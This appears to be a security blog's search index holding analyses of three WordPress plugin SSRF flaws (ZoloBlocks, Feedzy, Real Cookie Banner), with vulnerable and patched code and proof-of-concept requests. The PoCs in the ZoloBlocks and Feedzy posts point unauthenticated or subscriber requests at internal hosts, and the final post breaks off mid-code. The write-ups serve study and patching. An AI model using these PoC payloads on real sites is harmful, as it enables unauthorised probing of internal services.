","date":"2025-10-31","objectID":"/posts/2025-10-31-cve-2025-60161/:1:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-60161 Analysis \u0026 POC","uri":"/posts/2025-10-31-cve-2025-60161/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - ZoloBlocks: 2.3.11 (vulnerable) and 2.3.12 (patched). Diff tool - Meld or any diff/comparison tool to inspect differences between the two versions. ","date":"2025-10-31","objectID":"/posts/2025-10-31-cve-2025-60161/:2:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-60161 Analysis \u0026 POC","uri":"/posts/2025-10-31-cve-2025-60161/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r","date":"2025-10-31","objectID":"/posts/2025-10-31-cve-2025-60161/:3:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-60161 Analysis \u0026 POC","uri":"/posts/2025-10-31-cve-2025-60161/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff\rThe vulnerability existed in the file TemplatesV1.php, however this file was removed in the patched release. TemplatesV1.php was removed in the patch\r","date":"2025-10-31","objectID":"/posts/2025-10-31-cve-2025-60161/:3:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-60161 Analysis \u0026 POC","uri":"/posts/2025-10-31-cve-2025-60161/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code\rpublic function demo_import() { // Check input parameter from POST if (!isset($_POST['json_file_url'])) { wp_send_json_error('No JSON file URL provided'); return; } // Retrieve and sanitize the user-provided URL $json_file_url = sanitize_text_field(wp_unslash($_POST['json_file_url'])); // Send an HTTP request to that URL $response = wp_remote_get($json_file_url, ['timeout' =\u003e 30]); // If there's an error when fetching data, return a JSON error if (is_wp_error($response)) { wp_send_json_error('Failed to fetch JSON data'); return; } // Retrieve the response body and decode the JSON $body = wp_remote_retrieve_body($response); $data = json_decode($body, true); $content = $data['content'] ?? ''; // Return a successful JSON response including the imported content wp_send_json_success([ 'status' =\u003e 'success', 'message' =\u003e __('Pattern imported successfully!', 'zoloblocks'), 'content' =\u003e $content, ]); } Bug\rThe demo_import() function accepts a URL from the user → issues an HTTP request (wp_remote_get) to fetch JSON → decodes it and returns the result via wp_send_json_success(). Because it does not validate or restrict the URL, it can be abused to cause SSRF.\rThe demo_import() function is registered as a callback for an action hook: add_action('wp_ajax_nopriv_zolo_demo_import', [$this, 'demo_import']); This means: The wp_ajax_nopriv_ hook is used for unauthenticated users (anonymous users). When a client sends an AJAX request to the endpoint admin-ajax.php?action=zolo_demo_import, WordPress will invoke the demo_import() function. ","date":"2025-10-31","objectID":"/posts/2025-10-31-cve-2025-60161/:3:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-60161 Analysis \u0026 POC","uri":"/posts/2025-10-31-cve-2025-60161/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph TD\rA[\"admin-ajax.php?action=zolo_demo_import\"] --\u003e B[\"wp_ajax_nopriv_zolo_demo_import\"]\rB --\u003e C[\"demo_import()\"]\rC --\u003e D[\"sanitize_text_field()\"]\rD --\u003e E[\"wp_remote_get(json_file_url)\"]\rE --\u003e F{\"is_wp_error(response)?\"}\rF -- Yes --\u003e G[\"wp_send_json_error()\"]\rF -- No --\u003e H[\"json_decode(body) → extract URLs\"]\rH --\u003e I[\"wp_send_json_success()\"]\rgraph TD\rA[\"admin-ajax.php?action=zolo_demo_import\"] --\u003e B[\"wp_ajax_nopriv_zolo_demo_import\"]\rB --\u003e C[\"demo_import()\"]\rC --\u003e D[\"sanitize_text_field()\"]\rD --\u003e E[\"wp_remote_get(json_file_url)\"]\rE --\u003e F{\"is_wp_error(response)?\"}\rF -- Yes --\u003e G[\"wp_send_json_error()\"]\rF -- No --\u003e H[\"json_decode(body) → extract URLs\"]\rH --\u003e I[\"wp_send_json_success()\"]\rgraph TD\rA[\"admin-ajax.php?action=zolo_demo_import\"] --\u003e B[\"wp_ajax_nopriv_zolo_demo_import\"]\rB --\u003e C[\"demo_import()\"]\rC --\u003e D[\"sanitize_text_field()\"]\rD --\u003e E[\"wp_remote_get(json_file_url)\"]\rE --\u003e F{\"is_wp_error(response)?\"}\rF -- Yes --\u003e G[\"wp_send_json_error()\"]\rF -- No --\u003e H[\"json_decode(body) → extract URLs\"]\rH --\u003e I[\"wp_send_json_success()\"]\rgraph TD\rA[\"admin-ajax.php?action=zolo_demo_import\"] --\u003e B[\"wp_ajax_nopriv_zolo_demo_import\"]\rB --\u003e C[\"demo_import()\"]\rC --\u003e D[\"sanitize_text_field()\"]\rD --\u003e E[\"wp_remote_get(json_file_url)\"]\rE --\u003e F{\"is_wp_error(response)?\"}\rF -- Yes --\u003e G[\"wp_send_json_error()\"]\rF -- No --\u003e H[\"json_decode(body) → extract URLs\"]\rH --\u003e I[\"wp_send_json_success()\"]\r","date":"2025-10-31","objectID":"/posts/2025-10-31-cve-2025-60161/:3:3","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-60161 Analysis \u0026 POC","uri":"/posts/2025-10-31-cve-2025-60161/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-10-31","objectID":"/posts/2025-10-31-cve-2025-60161/:4:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-60161 Analysis \u0026 POC","uri":"/posts/2025-10-31-cve-2025-60161/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Local Server\rCreate a simple local service using Python from flask import Flask, send_from_directory import os BASE_DIR = os.path.abspath(os.getcwd()) app = Flask(__name__) @app.route('/metadata') def test(): return send_from_directory(BASE_DIR, 'metadata.json', as_attachment=True) if __name__ == '__main__': app.run(host='0.0.0.0', port=8001, debug=True) ","date":"2025-10-31","objectID":"/posts/2025-10-31-cve-2025-60161/:4:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-60161 Analysis \u0026 POC","uri":"/posts/2025-10-31-cve-2025-60161/#local-server"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rSend a POST request with the URL pointing to the local service: POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... action=zolo_demo_import\u0026json_file_url=http://127.0.0.1:8001/metadata Result: Content read from the local service\r","date":"2025-10-31","objectID":"/posts/2025-10-31-cve-2025-60161/:4:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-60161 Analysis \u0026 POC","uri":"/posts/2025-10-31-cve-2025-60161/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rCVE-2025-60161 is an SSRF in demo_import() of ZoloBlocks (≤ 2.3.11) caused by accepting a user-supplied URL and calling wp_remote_get() without validation. The endpoint allows unauthenticated access (wp_ajax_nopriv_...). The issue has been patched in 2.3.12. ","date":"2025-10-31","objectID":"/posts/2025-10-31-cve-2025-60161/:5:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-60161 Analysis \u0026 POC","uri":"/posts/2025-10-31-cve-2025-60161/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways\rRoot cause: not validating/whitelisting the URL before calling wp_remote_get(). Impact: sites running ZoloBlocks ≤ 2.3.11; an attacker can query internal services (SSRF). Quick mitigation: update to 2.3.12 or block the zolo_demo_import endpoint. Prevention: whitelist/validate URLs, limit egress, protect AJAX actions with nonces/permissions. ","date":"2025-10-31","objectID":"/posts/2025-10-31-cve-2025-60161/:6:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-60161 Analysis \u0026 POC","uri":"/posts/2025-10-31-cve-2025-60161/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rSSRF (Server Side Request Forgery) — Hacktrick WordPress ZoloBlocks Plugin \u003c= 2.3.11 is vulnerable to Server Side Request Forgery (SSRF) ","date":"2025-10-31","objectID":"/posts/2025-10-31-cve-2025-60161/:7:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-60161 Analysis \u0026 POC","uri":"/posts/2025-10-31-cve-2025-60161/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Feedzy Plugin.","date":"2025-10-30","objectID":"/posts/2025-10-30-cve-2025-11128/","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11128 Analysis \u0026 POC","uri":"/posts/2025-10-30-cve-2025-11128/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rThe Feedzy RSS Aggregator plugin – Feed to Post, Autoblogging, News \u0026 YouTube Video Feeds Aggregator for WordPress has a Server-Side Request Forgery vulnerability in all versions up to and including 5.1.0 via the function 'feedzy_sanitize_feeds'. This allows an authenticated attacker with Subscriber level access or higher to perform web requests to arbitrary addresses originating from the web application and can be used to query information from internal services. CVE ID: CVE-2025-11128 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 5.1.0 Patched Versions: 5.1.1 CVSS severity: Low (5) Required Privilege: Subscriber Product: WordPress Feedzy Plugin ","date":"2025-10-30","objectID":"/posts/2025-10-30-cve-2025-11128/:1:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11128 Analysis \u0026 POC","uri":"/posts/2025-10-30-cve-2025-11128/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Feedzy: 5.1.0 (vulnerable) and 5.1.1 (patched). Diff tool - Meld or any diff/comparison tool to inspect and compare differences between the two versions. ","date":"2025-10-30","objectID":"/posts/2025-10-30-cve-2025-11128/:2:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11128 Analysis \u0026 POC","uri":"/posts/2025-10-30-cve-2025-11128/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\rThe Feedzy RSS Aggregator plugin registers a REST API endpoint at /feedzy/v1/feed/ which allows users to submit a URL to fetch feed data. However, in version 5.1.0, this endpoint is weakly protected and the URL filtering mechanism is unsafe, leading to a Server-Side Request Forgery (SSRF) vulnerability. ","date":"2025-10-30","objectID":"/posts/2025-10-30-cve-2025-11128/:3:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11128 Analysis \u0026 POC","uri":"/posts/2025-10-30-cve-2025-11128/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff\rpublic function feedzy_register_rest_route() { register_rest_route( 'feedzy/v1', '/feed/', array( 'methods' =\u003e 'POST', 'callback' =\u003e array( $this, 'feedzy_rest_route' ), 'permission_callback' =\u003e function () { return is_user_logged_in(); }, 'args' =\u003e array( 'url' =\u003e array( 'sanitize_callback' =\u003e array( $this, 'feedzy_sanitize_feeds' ), ), 'category' =\u003e array( 'sanitize_callback' =\u003e array( $this, 'feedzy_sanitize_categories' ), ), ), ) ); } public function feedzy_sanitize_feeds( $input ) { if ( count( $input ) === 1 ) { $feed = esc_url( $input[0] ); return $feed; } else { $feeds = array(); foreach ( $input as $item ) { $feeds[] = esc_url( $item ); } return $feeds; } } In the vulnerable version: The endpoint only checks is_user_logged_in(), meaning any logged-in account (including Subscriber) can send requests. The function feedzy_sanitize_feeds() only uses esc_url() — this function sanitizes a URL string for display, but does not validate correctness or restrict access to internal addresses. Bug\rTherefore, an attacker can send the payload url=http://localhost:8001/admin to coerce the server to send a request to an internal service → SSRF.\rpublic function feedzy_register_rest_route() { register_rest_route( 'feedzy/v1', '/feed/', array( 'methods' =\u003e 'POST', 'callback' =\u003e array( $this, 'feedzy_rest_route' ), 'permission_callback' =\u003e function ( WP_REST_Request $request ) { $post_id = absint( $request-\u003eget_param( 'postId' ) ); return current_user_can( 'edit_post', $post_id ); }, 'args' =\u003e array( 'url' =\u003e array( 'sanitize_callback' =\u003e array( $this, 'feedzy_sanitize_feeds' ), ), 'category' =\u003e array( 'sanitize_callback' =\u003e array( $this, 'feedzy_sanitize_categories' ), ), ), ) ); } public function feedzy_sanitize_feeds( $input ) { if ( count( $input ) === 1 ) { $feed = wp_http_validate_url( $input[0] ); return $feed; } else { $feeds = array(); foreach ( $input as $item ) { if ( wp_http_validate_url( $item ) ) { $feeds[] = esc_url_raw( $item ); } } return $feeds; } } The patch: Restricts REST API access using current_user_can( 'edit_post', $post_id ), allowing only Editors or Admins with the capability to call the endpoint. Replaces esc_url() with wp_http_validate_url(), ensuring the URL is valid, only accepts http/https protocols, and excludes internal addresses (loopback, localhost, 127.0.0.1...). Uses esc_url_raw() to safely store the URL without re-encoding for display. Info\rThe count() in feedzy_sanitize_feeds() requires the input parameter to be Countable or an array. If a string is passed, PHP will throw an error: Bug\rException has occurred. TypeError: count(): Argument #1 ($value) must be of type Countable|array, string given\rTherefore, when sending a request to the endpoint, the url parameter must be passed as an array, for example: url[0]=\"http://example.com\" ","date":"2025-10-30","objectID":"/posts/2025-10-30-cve-2025-11128/:3:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11128 Analysis \u0026 POC","uri":"/posts/2025-10-30-cve-2025-11128/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code\rfeedzy_rest_route() is registered as the callback for the API: public function feedzy_rest_route( $data ) { $feed = $data; if ( isset( $data['feeds'] ) ) { $feed_category = $this-\u003efeedzy_sanitize_categories( $data['feeds'] ); if ( $feed_category ) { $data['url'] = $feed_category; } } if ( ! empty( $data['url'] ) ) { $feed = $data['url']; } elseif ( ! empty( $data['category'] ) ) { $feed = $data['category']; } $url = ''; if ( ! $feed instanceof \\WP_REST_Request ) { $url = $feed; } $meta_args = array( 'date_format' =\u003e get_option( 'date_format' ), 'time_format' =\u003e get_option( 'time_format' ), ); $instance = Feedzy_Rss_Feeds::instance(); $admin = $instance-\u003eget_admin(); $feed = $admin-\u003efetch_feed( $url, '12_hours', array( '' ) ); $feedy = array(); if ( ! $feed-\u003einit() ) { $feedy['error'] = __( 'Invalid Feed URL', 'feedzy-rss-feeds' ); header( 'Content-Type: application/json; charset=' . get_option( 'blog_charset' ) ); return $feedy; } if ( ( ! $feed-\u003eget_title() ) \u0026\u0026 ( ! $feed-\u003eget_title() ) \u0026\u0026 ( ! $feed-\u003eget_title() ) ) { $feedy['channel'] = null; } else { $feedy['channel'] = array( 'title' =\u003e ( ( $feed-\u003eget_title() ) ? $feed-\u003eget_title() : null ), 'description' =\u003e ( ( $feed-\u003eget_description() ) ? $feed-\u003eget_description() : null ), 'permalink' =\u003e ( ( $feed-\u003eget_permalink() ) ? $feed-\u003eget_permalink() : null ), ); } $feedy['items'] = array(); $items = $feed-\u003eget_items(); $is_multiple = ! empty( $feed-\u003emultifeed_url ) \u0026\u0026 is_array( $feed-\u003emultifeed_url ); foreach ( $items as $item ) { $item_attrs = apply_filters( 'feedzy_item_filter', array(), $item ); array_push( $feedy['items'], array( 'title' =\u003e ( ( $item-\u003eget_title() ) ? $item-\u003eget_title() : null ), 'link' =\u003e ( ( $item-\u003eget_permalink() ) ? $item-\u003eget_permalink() : null ), 'creator' =\u003e ( ( $item-\u003eget_author() ) ? $item-\u003eget_author()-\u003eget_name() : null ), 'source' =\u003e $is_multiple \u0026\u0026 $item-\u003eget_feed()-\u003eget_title() ? $item-\u003eget_feed()-\u003eget_title() : '', 'pubDate' =\u003e ( ( $item-\u003eget_date() ) ? $item-\u003eget_date( 'U' ) : null ), 'date' =\u003e ( ( $item-\u003eget_date() ) ? date_i18n( $meta_args['date_format'], $item-\u003eget_date( 'U' ) ) : null ), 'time' =\u003e ( ( $item-\u003eget_date() ) ? date_i18n( $meta_args['time_format'], $item-\u003eget_date( 'U' ) ) : null ), 'description' =\u003e isset( $item_attrs['item_description'] ) ? $item_attrs['item_description'] : ( $item-\u003eget_description() ? $item-\u003eget_description() : null ), 'thumbnail' =\u003e $admin-\u003efeedzy_retrieve_image( $item ), 'default_img' =\u003e apply_filters( 'feedzy_default_image', '', $url ), 'price' =\u003e isset( $item_attrs['item_price'] ) ? $item_attrs['item_price'] : null, 'media' =\u003e isset( $item_attrs['item_media'] ) ? $item_attrs['item_media'] : null, 'categories' =\u003e isset( $item_attrs['item_categories'] ) ? $item_attrs['item_categories'] : null, ) ); } header( 'Content-Type: application/json; charset=' . get_option( 'blog_charset' ) ); $output = $feedy; return $output; } Logic of the function: Receive and process input data $feed = $data; if ( isset( $data['feeds'] ) ) { $feed_category = $this-\u003efeedzy_sanitize_categories( $data['feeds'] ); if ( $feed_category ) { $data['url'] = $feed_category; } } The function checks if the request contains the feeds parameter; it is sanitized via feedzy_sanitize_categories(). If valid, the result is assigned back to $data['url']. Choose the data source $feed with priority if ( ! empty( $data['url'] ) ) { $feed = $data['url']; } elseif ( ! empty( $data['category'] ) ) { $feed = $data['category']; } If url exists → use it as the main source. If not → use category. → This is where user input (url) is forwarded to the feed fetching process. Prepare variable $url $url = ''; if ( ! $feed instanceof \\WP_REST_Request ) { $url = $feed; } If $feed is not an instance of WP_REST_Request, it is assigned to $url. In practice $feed is usually a URL string or an array of URLs taken from the request. Call core processing function $instance = Feedzy_Rss_Feeds::instance(); $admin = $instance-\u003eget_admin(); $feed = $admin-\u003efetch_f","date":"2025-10-30","objectID":"/posts/2025-10-30-cve-2025-11128/:3:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11128 Analysis \u0026 POC","uri":"/posts/2025-10-30-cve-2025-11128/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph TD\rA[\"User input via /feedzy/v1/feed (REST API)\"] --\u003e B[\"feedzy_sanitize_feeds()\"]\rB --\u003e C[\"esc_url() → no internal host validation\"]\rC --\u003e D[\"feedzy_rest_route()\"]\rD --\u003e E[\"Feedzy_Rss_Feeds::instance()\"]\rE --\u003e F[\"$admin-\u003efetch_feed(url)\"]\rF --\u003e G{\"feedzy_amazon_get_locale_hosts() exists?\"}\rG -- No --\u003e H[\"init_feed()\"]\rH --\u003e I[\"Feedzy_Rss_Feeds_Util_SimplePie::init()\"]\rI --\u003e J[\"fetch_data(cache)\"]\rJ --\u003e K[\"HTTP request to user-controlled URL → SSRF\"]\rgraph TD\rA[\"User input via /feedzy/v1/feed (REST API)\"] --\u003e B[\"feedzy_sanitize_feeds()\"]\rB --\u003e C[\"esc_url() → no internal host validation\"]\rC --\u003e D[\"feedzy_rest_route()\"]\rD --\u003e E[\"Feedzy_Rss_Feeds::instance()\"]\rE --\u003e F[\"$admin-\u003efetch_feed(url)\"]\rF --\u003e G{\"feedzy_amazon_get_locale_hosts() exists?\"}\rG -- No --\u003e H[\"init_feed()\"]\rH --\u003e I[\"Feedzy_Rss_Feeds_Util_SimplePie::init()\"]\rI --\u003e J[\"fetch_data(cache)\"]\rJ --\u003e K[\"HTTP request to user-controlled URL → SSRF\"]\rgraph TD\rA[\"User input via /feedzy/v1/feed (REST API)\"] --\u003e B[\"feedzy_sanitize_feeds()\"]\rB --\u003e C[\"esc_url() → no internal host validation\"]\rC --\u003e D[\"feedzy_rest_route()\"]\rD --\u003e E[\"Feedzy_Rss_Feeds::instance()\"]\rE --\u003e F[\"$admin-\u003efetch_feed(url)\"]\rF --\u003e G{\"feedzy_amazon_get_locale_hosts() exists?\"}\rG -- No --\u003e H[\"init_feed()\"]\rH --\u003e I[\"Feedzy_Rss_Feeds_Util_SimplePie::init()\"]\rI --\u003e J[\"fetch_data(cache)\"]\rJ --\u003e K[\"HTTP request to user-controlled URL → SSRF\"]\rgraph TD\rA[\"User input via /feedzy/v1/feed (REST API)\"] --\u003e B[\"feedzy_sanitize_feeds()\"]\rB --\u003e C[\"esc_url() → no internal host validation\"]\rC --\u003e D[\"feedzy_rest_route()\"]\rD --\u003e E[\"Feedzy_Rss_Feeds::instance()\"]\rE --\u003e F[\"$admin-\u003efetch_feed(url)\"]\rF --\u003e G{\"feedzy_amazon_get_locale_hosts() exists?\"}\rG -- No --\u003e H[\"init_feed()\"]\rH --\u003e I[\"Feedzy_Rss_Feeds_Util_SimplePie::init()\"]\rI --\u003e J[\"fetch_data(cache)\"]\rJ --\u003e K[\"HTTP request to user-controlled URL → SSRF\"]\r","date":"2025-10-30","objectID":"/posts/2025-10-30-cve-2025-11128/:3:3","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11128 Analysis \u0026 POC","uri":"/posts/2025-10-30-cve-2025-11128/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-10-30","objectID":"/posts/2025-10-30-cve-2025-11128/:4:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11128 Analysis \u0026 POC","uri":"/posts/2025-10-30-cve-2025-11128/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Local Server\rCreate a simple local service using Python from flask import Flask, request, send_from_directory, Response import os BASE_DIR = os.path.abspath(os.getcwd()) app = Flask(__name__) @app.route('/delete', methods=['GET']) def delete(): file_id = request.args.get('id') if not file_id: return \"No id provided\", 400 print(f\"delete it: {file_id}\") return f\"Delete it: {file_id}\" @app.route('/metadata') def metadata(): return send_from_directory(BASE_DIR, 'metadata.json', as_attachment=True) @app.route('/feed', methods=['GET']) def feed(): xml_content = \"\"\"\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003crss version=\"2.0\"\u003e \u003cchannel\u003e \u003ctitle\u003eExample Feed\u003c/title\u003e \u003clink\u003ehttps://example.com\u003c/link\u003e \u003cdescription\u003eThis is a sample RSS feed generated by Flask.\u003c/description\u003e \u003citem\u003e \u003ctitle\u003eFirst item\u003c/title\u003e \u003clink\u003ehttps://example.com/item1\u003c/link\u003e \u003cdescription\u003eHello world!\u003c/description\u003e \u003c/item\u003e \u003citem\u003e \u003ctitle\u003eSecond item\u003c/title\u003e \u003clink\u003ehttps://example.com/item2\u003c/link\u003e \u003cdescription\u003eAnother entry.\u003c/description\u003e \u003c/item\u003e \u003c/channel\u003e \u003c/rss\u003e\"\"\" return Response(xml_content, mimetype='application/xml') if __name__ == '__main__': app.run(host='0.0.0.0', port=8001, debug=True) ","date":"2025-10-30","objectID":"/posts/2025-10-30-cve-2025-11128/:4:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11128 Analysis \u0026 POC","uri":"/posts/2025-10-30-cve-2025-11128/#local-server"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rLogin with a Contributor account Send a POST request with the URL pointing to the local service: POST /wp-json/feedzy/v1/feed HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: http://localhost/wp-login.php?redirect_to=http%3A%2F%2Flocalhost%2Fwp-admin%2F\u0026reauth=1 Connection: keep-alive Cookie: wordpress_86a9106ae65537651a8e456835b316ab=sub%7C1761790291%7C0Q8NLwANiN0Uz0cgmvSAN6iBfEFzSylzkAkZn4kLcoG%7Cdf597bffe4c239d9e871b2ac98a2d427df0fb82dc7a09099bc026fbbff641ad1; wp-settings-time-2=1761542750; _lscache_vary=0f9122a3a07756eeee3b4199f2c151b1; wp-settings-time-3=1761591693; wp-settings-3=mfold%3Do; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=sub%7C1761790291%7C0Q8NLwANiN0Uz0cgmvSAN6iBfEFzSylzkAkZn4kLcoG%7Cd42e05305965ebb0efad0d1374e9552219c641afb6452531634d3b4e414c6a48; wp_lang=en_US url[0]=http://localhost:8001/feed\u0026category=cat Result: Content read from the local service\rNote\rIf trying url with a file that is not XML, we get the response: Result when file is not an XML\r","date":"2025-10-30","objectID":"/posts/2025-10-30-cve-2025-11128/:4:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11128 Analysis \u0026 POC","uri":"/posts/2025-10-30-cve-2025-11128/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rThe CVE-2025-11128 vulnerability in the Feedzy RSS Aggregator plugin stems from unsafe handling of URLs in the /feedzy/v1/feed REST API. The function feedzy_sanitize_feeds() only used esc_url() and did not validate addresses, allowing an attacker with Subscriber privileges to send SSRF requests to internal services. The 5.1.1 patch fixes this by using wp_http_validate_url(), tightening API access via current_user_can('edit_post', $post_id) and replacing esc_url() with esc_url_raw(). ","date":"2025-10-30","objectID":"/posts/2025-10-30-cve-2025-11128/:5:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11128 Analysis \u0026 POC","uri":"/posts/2025-10-30-cve-2025-11128/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways\resc_url() is not sufficient to validate incoming URLs. REST APIs must be properly restricted with appropriate permissions. URLs must be validated and filtered to prevent SSRF to internal networks. ","date":"2025-10-30","objectID":"/posts/2025-10-30-cve-2025-11128/:6:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11128 Analysis \u0026 POC","uri":"/posts/2025-10-30-cve-2025-11128/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rSSRF (Server Side Request Forgery) — Hacktrick WordPress Feedzy Plugin \u003c= 5.1.0 is vulnerable to Server Side Request Forgery (SSRF) ","date":"2025-10-30","objectID":"/posts/2025-10-30-cve-2025-11128/:7:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11128 Analysis \u0026 POC","uri":"/posts/2025-10-30-cve-2025-11128/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Real Cookie Banner Plugin.","date":"2025-10-29","objectID":"/posts/2025-10-29-cve-2025-12136/","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-12136 Analysis \u0026 POC","uri":"/posts/2025-10-29-cve-2025-12136/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rThe Real Cookie Banner: GDPR \u0026 ePrivacy Cookie Consent plugin for WordPress is vulnerable to Server-Side Request Forgery (SSRF) in all versions up to and including 5.2.4. The root cause is insufficient validation of the user-supplied URL at the REST API endpoint /scanner/scan-without-login. This allows authenticated attackers with administrator-level access to make web requests to arbitrary locations originating from the web application and can be used to query and modify information from internal services via the url parameter. CVE ID: CVE-2025-12136 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 5.2.4 Patched Versions: 5.2.5 CVSS severity: Low (5.5) Required Privilege: Administrator Product: WordPress Real Cookie Banner Plugin ","date":"2025-10-29","objectID":"/posts/2025-10-29-cve-2025-12136/:1:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-12136 Analysis \u0026 POC","uri":"/posts/2025-10-29-cve-2025-12136/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Real Cookie Banner: 5.2.4 (vulnerable) and 5.2.5 (patched). Diff tool - Meld or any diff tool to inspect and compare differences between versions. ","date":"2025-10-29","objectID":"/posts/2025-10-29-cve-2025-12136/:2:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-12136 Analysis \u0026 POC","uri":"/posts/2025-10-29-cve-2025-12136/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r","date":"2025-10-29","objectID":"/posts/2025-10-29-cve-2025-12136/:3:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-12136 Analysis \u0026 POC","uri":"/posts/2025-10-29-cve-2025-12136/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff\rpublic function routeScanWithoutLogin($request) { $url = $request-\u003eget_param('url'); $jobId = $request-\u003eget_param('jobId'); if ($checker-\u003estart($url, \\false)) { $requestArguments = $checker-\u003egetRequestArguments(); $result = \\wp_remote_get($url, ['redirection' =\u003e 0, 'cookies' =\u003e $requestArguments['cookies'], 'headers' =\u003e $requestArguments['headers'], 'timeout' =\u003e $requestArguments['timeout'], 'sslverify' =\u003e $requestArguments['sslverify']]); $status = \\wp_remote_retrieve_response_code($result); $ok = $status \u003e= 200 \u0026\u0026 $status \u003c 300; $location = \\wp_remote_retrieve_header($result, 'Location'); return new WP_REST_Response(['status' =\u003e $status, 'statusText' =\u003e \\wp_remote_retrieve_response_message($result), 'ok' =\u003e $ok, 'headers' =\u003e (object) \\wp_remote_retrieve_headers($result), 'redirected' =\u003e !empty($location), 'responseUrl' =\u003e $location, 'body' =\u003e \\wp_remote_retrieve_body($result)]); } else { return new WP_Error('rest_scan_without_login_error', 'Loopback request could not be started.'); } } In the vulnerable version, routeScanWithoutLogin() takes the url parameter directly from $request-\u003eget_param('url') and uses it in wp_remote_get() without any validation or filtering =\u003e this leads to a Server-Side Request Forgery (SSRF) vulnerability. The response packages the full result from wp_remote_get($url) into JSON: status, statusText: HTTP status code and message. ok: true if status is 2xx. headers: all response headers. redirected, responseUrl: redirect information if present. body: response body content from the URL. =\u003e The server effectively forwards the entire response from the internal URL back to the caller, causing data leakage when SSRF is exploited. public function routeScanWithoutLogin($request) { $url = $request-\u003eget_param('url'); $jobId = $request-\u003eget_param('jobId'); // Validate that the URL belongs to the jobs' domain to prevent SSRF attacks $jobDataUrl = $job-\u003edata-\u003eurl; $parsed_url = \\wp_parse_url($url); if (!$parsed_url || !isset($parsed_url['host'])) { return new WP_Error('rest_invalid_url', 'Invalid URL provided'); } $current_domain = \\wp_parse_url($jobDataUrl, \\PHP_URL_HOST); if ($parsed_url['host'] !== $current_domain) { return new WP_Error('rest_invalid_domain', 'URL must belong to the jobs\\' domain'); } if ($checker-\u003estart($url, \\false)) { $requestArguments = $checker-\u003egetRequestArguments(); $result = \\wp_remote_get($url, ['redirection' =\u003e 0, 'cookies' =\u003e $requestArguments['cookies'], 'headers' =\u003e 